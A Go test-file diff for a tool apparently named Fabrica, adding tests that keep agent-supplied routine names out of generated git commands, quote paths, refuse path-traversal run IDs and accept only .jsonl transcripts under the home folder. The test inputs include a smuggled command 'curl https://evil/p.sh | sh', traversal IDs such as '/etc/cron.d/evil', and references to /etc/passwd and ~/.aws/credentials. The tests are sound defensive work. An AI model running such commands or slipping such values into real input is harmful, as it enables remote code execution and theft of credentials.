@@ -317,6 +317,73 @@ func TestBlueprintPaths(t *testing.T) {
 	}
 }
 
+// Agents choose the routine name that run_begin records, even when Fabrica
+// refuses the run, so it can be anything. Only a name that is one may end up
+// in a command someone will paste into a shell.
+func TestNoGitCommandForANameThatIsntOne(t *testing.T) {
+	evil := "x.md; curl https://evil/p.sh | sh #"
+	v := testView()
+	v.BlueprintPath = func(string) (string, bool) { return "", true }
+
+	d := detail()
+	d.Routine = evil
+	interactive := detail(load("07:41:06", "rule", "a; curl https://evil/p.sh | sh #"), load("07:41:07", "skill", "../../etc/passwd"),
+		load("07:41:08", "skill", "pr-review"), load("07:41:09", "rule", "commit-messages"))
+	interactive.Routine = ""
+
+	for name, got := range map[string]string{
+		"show": v.Show(d), "Markdown": v.Markdown(d),
+		"show, interactive": v.Show(interactive), "Markdown, interactive": v.Markdown(interactive),
+	} {
+		for _, bad := range []string{"curl ", "etc/passwd", "x.md"} {
+			for _, line := range strings.Split(got, "\n") {
+				if strings.Contains(line, "git ") && strings.Contains(line, bad) {
+					t.Errorf("%s has a command with %q in it: %s", name, bad, line)
+				}
+			}
+		}
+	}
+	// The name is still shown, as plain text, to diagnose the refusal.
+	if got := v.Show(d); !strings.Contains(got, evil) || strings.Contains(got, "git ") || strings.Contains(got, "instructions this run was served") {
+		t.Errorf("a run with a bad routine name:\n%s", got)
+	}
+	// The valid names of an interactive run still get their commands.
+	got := v.Show(interactive)
+	for _, want := range []string{"show ee8f142:skills/pr-review/SKILL.md\n", "show ee8f142:rules/commit-messages.mdc\n"} {
+		if !strings.Contains(got, want) {
+			t.Errorf("show is missing %q:\n%s", want, got)
+		}
+	}
+	if n := strings.Count(got, "git -C"); n != 2 {
+		t.Errorf("%d commands, want 2 (one per valid name):\n%s", n, got)
+	}
+
+	// The bundle's README gathers the commands of every run.
+	dir := filepath.Join(t.TempDir(), "bundle")
+	if err := v.WriteBundle(dir, Bundle{Runs: []*runs.Detail{d}}); err != nil {
+		t.Fatal(err)
+	}
+	readme, err := os.ReadFile(filepath.Join(dir, "README.md"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(readme), "git -C") {
+		t.Errorf("the README has a command for a bad name:\n%s", readme)
+	}
+}
+
+// A blueprint folder can have spaces or quotes in its name, so the path
+// goes in the command quoted.
+func TestGitCommandQuotesThePath(t *testing.T) {
+	d := detail()
+	v := testView()
+	v.BlueprintPath = func(string) (string, bool) { return "my team/it's $HOME", true }
+	want := `show 'ee8f142:my team/it'\''s $HOME/routines/pr-review.md'` + "\n"
+	if got := v.Show(d); !strings.Contains(got, want) {
+		t.Errorf("show is missing %q:\n%s", want, got)
+	}
+}
+
 func TestCounts(t *testing.T) {
 	var list []*runs.Detail
 	for _, o := range []string{"failed", "succeeded", "stale", "succeeded", "in_progress", "succeeded"} {
@@ -381,7 +448,10 @@ func TestBundle(t *testing.T) {
 	refused := detail(runs.Event{At: at("16", "18:00:00"), Type: runs.EventCheckpoint, Author: runs.ByFabrica, Status: "failed", Summary: "Refused: stub is outdated", Links: []string{}})
 	refused.RunID, refused.Outcome, refused.StartedAt, refused.BlueprintSHA = "run_b", "failed", at("16", "18:00:00"), ""
 	refused.Session, refused.LastSummary = "/definitely/not/a/file/here.jsonl", "Refused: stub is outdated"
-	transcript := filepath.Join(t.TempDir(), "t.jsonl")
+	// A transcript is a .jsonl file in the home folder.
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	transcript := filepath.Join(home, "t.jsonl")
 	if err := os.WriteFile(transcript, nil, 0o644); err != nil {
 		t.Fatal(err)
 	}
@@ -480,10 +550,14 @@ func TestBundle(t *testing.T) {
 			t.Errorf("README is missing %q:\n%s", want, readme)
 		}
 	}
-	for _, not := range []string{"/definitely/not/a/file", "claude.ai/code/session_1"} {
-		if strings.Contains(readme, not) {
-			t.Errorf("README shouldn't list %q, which isn't a file on this machine", not)
-		}
+	// A URL isn't listed, and a path that isn't a transcript on this machine
+	// is only an unverified pointer (TestBundleSaysWhichTranscriptsItChecked
+	// has the details).
+	if strings.Contains(readme, "claude.ai/code/session_1") {
+		t.Errorf("README shouldn't list a session URL:\n%s", readme)
+	}
+	if _, listed, _ := strings.Cut(readme, "an unverified pointer"); !strings.Contains(listed, "- /definitely/not/a/file/here.jsonl (run_b, failed)\n") {
+		t.Errorf("README should list the path that isn't a transcript as unverified:\n%s", readme)
 	}
 	// A bundle from this machine says where it read from, and one that has
 	// more than it holds says so.
@@ -493,34 +567,179 @@ func TestBundle(t *testing.T) {
 	}
 }
 
-func TestLocalFile(t *testing.T) {
-	dir := t.TempDir()
-	file := filepath.Join(dir, "t.jsonl")
-	if err := os.WriteFile(file, nil, 0o644); err != nil {
-		t.Fatal(err)
+// A bundle names the file of each run after its ID, and with --server the
+// IDs come from a server that may not be the one it should be. An ID that
+// isn't one Fabrica makes could write a file anywhere.
+func TestBundleRefusesIDsThatArentRunIDs(t *testing.T) {
+	good := detail()
+	good.RunID = runs.NewID(now)
+	for _, id := range []string{
+		"../../evil", "run_../../evil", "run_a/../../evil", "/etc/cron.d/evil", `run_a\..\evil`, "run_a.md", "run_", "", "RUN_A", "run_A", "run_a b", "run_a\x00b", "run_\u00e9", "x_run_a",
+		"run_a\n", "..", ".", "run_a/b",
+	} {
+		bad := detail()
+		bad.RunID = id
+		parent := t.TempDir()
+		dir := filepath.Join(parent, "bundle")
+		err := testView().WriteBundle(dir, Bundle{Server: "https://fabrica.acme.dev", Runs: []*runs.Detail{good, bad}})
+		if err == nil || !strings.Contains(err.Error(), "isn't a run ID") {
+			t.Errorf("run ID %q: WriteBundle = %v, want a refusal that says it isn't a run ID", id, err)
+		}
+		// Nothing is written, in the bundle or beside it.
+		if left, _ := os.ReadDir(parent); len(left) != 0 {
+			t.Errorf("run ID %q left %v behind", id, left)
+		}
 	}
+	// The IDs Fabrica makes, and the test ones in this package, are fine.
+	dir := filepath.Join(t.TempDir(), "bundle")
+	other := detail()
+	other.RunID = "run_01m4qb8knr0000000000000002"
+	if err := testView().WriteBundle(dir, Bundle{Runs: []*runs.Detail{good, other}}); err != nil {
+		t.Errorf("WriteBundle = %v", err)
+	}
+}
+
+func TestLocalFile(t *testing.T) {
 	home := t.TempDir()
 	t.Setenv("HOME", home)
-	if err := os.WriteFile(filepath.Join(home, "mine.jsonl"), nil, 0o644); err != nil {
+	outside := t.TempDir() // not in the home folder
+	write := func(path string) string {
+		t.Helper()
+		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(path, []byte("{}\n"), 0o600); err != nil {
+			t.Fatal(err)
+		}
+		return path
+	}
+	link := func(target, name string) string {
+		t.Helper()
+		if err := os.Symlink(target, name); err != nil {
+			t.Skipf("can't make symbolic links here: %v", err)
+		}
+		return name
+	}
+	transcript := write(filepath.Join(home, ".claude", "projects", "app", "abc.jsonl"))
+	mine := write(filepath.Join(home, "mine.jsonl"))
+	creds := write(filepath.Join(home, ".aws", "credentials"))
+	notes := write(filepath.Join(home, "notes.txt"))
+	away := write(filepath.Join(outside, "t.jsonl"))
+	if err := os.Mkdir(filepath.Join(home, "folder.jsonl"), 0o755); err != nil {
 		t.Fatal(err)
 	}
+	// A link in the home folder, to a transcript in it, to one outside, and a
+	// folder that leads outside.
+	linkToMine := link(mine, filepath.Join(home, "link.jsonl"))
+	linkAway := link(away, filepath.Join(home, "away.jsonl"))
+	linkedFolder := link(outside, filepath.Join(home, "out"))
+
 	for in, want := range map[string]string{
-		file:                                    file,
-		" " + file + "\n":                       file,
-		"~/mine.jsonl":                          filepath.Join(home, "mine.jsonl"),
-		dir:                                     "", // a folder
-		filepath.Join(dir, "gone.jsonl"):        "",
-		"t.jsonl":                               "", // not absolute
-		"copilot-local:3f2a9c":                  "",
-		"https://claude.ai/code/session_01":     "",
-		"":                                      "",
-		"~/gone.jsonl":                          "",
-		"../" + filepath.Base(dir) + "/t.jsonl": "",
+		transcript:                         transcript,
+		" " + transcript + "\n":            transcript,
+		mine:                               mine,
+		"~/mine.jsonl":                     mine,
+		"~/.claude/projects/app/abc.jsonl": transcript,
+		home + "/./.claude/projects/../../mine.jsonl": mine,
+		// Anything else on this machine isn't a transcript, whatever the
+		// agent says it is.
+		"/etc/passwd":                          "",
+		creds:                                  "", // not a .jsonl file
+		"~/.aws/credentials":                   "",
+		notes:                                  "",
+		away:                                   "", // outside the home folder
+		filepath.Join(home, "folder.jsonl"):    "", // a folder
+		filepath.Join(home, "gone.jsonl"):      "",
+		linkToMine:                             "", // a link, even to a file in the home folder
+		linkAway:                               "",
+		filepath.Join(linkedFolder, "t.jsonl"): "", // a folder that is a link to outside
+		home + "/../" + filepath.Base(outside) + "/t.jsonl": "",
+		"~/../" + filepath.Base(outside) + "/t.jsonl":       "",
+		home:                                "",
+		"t.jsonl":                           "", // not absolute
+		"copilot-local:3f2a9c":              "",
+		"https://claude.ai/code/session_01": "",
+		"file://" + mine:                    "",
+		"":                                  "",
+		"~/gone.jsonl":                      "",
+		"~":                                 "",
 	} {
 		got, ok := localFile(in)
 		if got != want || ok != (want != "") {
 			t.Errorf("localFile(%q) = %q, %v; want %q", in, got, ok, want)
 		}
+	}
+}
+
+// What the README says about a run's session pointer depends on whether it
+// is a transcript. Only a regular .jsonl file in the home folder is. A path
+// is something an agent chooses, so any other path is only what it said.
+func TestBundleSaysWhichTranscriptsItChecked(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	transcript := filepath.Join(home, "t.jsonl")
+	secret := filepath.Join(home, "credentials")
+	elsewhere := filepath.Join(t.TempDir(), "t.jsonl")
+	for _, f := range []string{transcript, secret, elsewhere} {
+		if err := os.WriteFile(f, nil, 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	mk := func(id, outcome, session string) *runs.Detail {
+		d := detail()
+		d.RunID, d.Outcome, d.Session = id, outcome, session
+		return d
+	}
+	list := []*runs.Detail{
+		mk("run_a", "succeeded", transcript), mk("run_b", "failed", secret), mk("run_c", "stale", elsewhere),
+		mk("run_d", "succeeded", "/etc/passwd"), mk("run_e", "succeeded", "https://claude.ai/code/session_1"), mk("run_f", "succeeded", ""),
+	}
+	dir := filepath.Join(t.TempDir(), "bundle")
+	if err := testView().WriteBundle(dir, Bundle{Runs: list}); err != nil {
+		t.Fatal(err)
+	}
+	data, err := os.ReadFile(filepath.Join(dir, "README.md"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	readme := string(data)
+	_, section, _ := strings.Cut(readme, "### Transcripts\n")
+	section, _, _ = strings.Cut(section, "\n## ")
+	checked, unchecked, split := strings.Cut(section, "report a file path")
+	if !split {
+		t.Fatalf("the Transcripts section has no part for the unverified paths:\n%s", section)
+	}
+	if !strings.Contains(checked, "- "+transcript+" (run_a, succeeded)\n") || !strings.Contains(checked, "a file on this machine") {
+		t.Errorf("the transcript that is one isn't listed as a file on this machine:\n%s", section)
+	}
+	for _, id := range []string{"run_b", "run_c", "run_d", "run_e", "run_f"} {
+		if strings.Contains(checked, id) {
+			t.Errorf("%s is listed as a file on this machine:\n%s", id, section)
+		}
+	}
+	// The others are only what the agents said, in a part that says so.
+	for _, want := range []string{
+		"- " + secret + " (run_b, failed)\n", "- " + elsewhere + " (run_c, stale)\n", "- /etc/passwd (run_d, succeeded)\n",
+		"The agent wrote", "unverified", "isn't a regular `.jsonl` file under your home folder",
+	} {
+		if !strings.Contains(unchecked, want) {
+			t.Errorf("the unverified part is missing %q:\n%s", want, section)
+		}
+	}
+	for _, id := range []string{"run_a", "run_e", "run_f"} {
+		if strings.Contains(unchecked, id) {
+			t.Errorf("%s is listed as an unverified path:\n%s", id, section)
+		}
+	}
+
+	// With no transcript at all, nothing claims there's a file on this machine.
+	dir = filepath.Join(t.TempDir(), "bundle")
+	if err := testView().WriteBundle(dir, Bundle{Runs: list[1:]}); err != nil {
+		t.Fatal(err)
+	}
+	data, _ = os.ReadFile(filepath.Join(dir, "README.md"))
+	if strings.Contains(string(data), "is a file on this machine") || !strings.Contains(string(data), "No run points at a transcript file on this machine.") {
+		t.Errorf("the README with no transcripts:\n%s", data)
 	}
 }
 
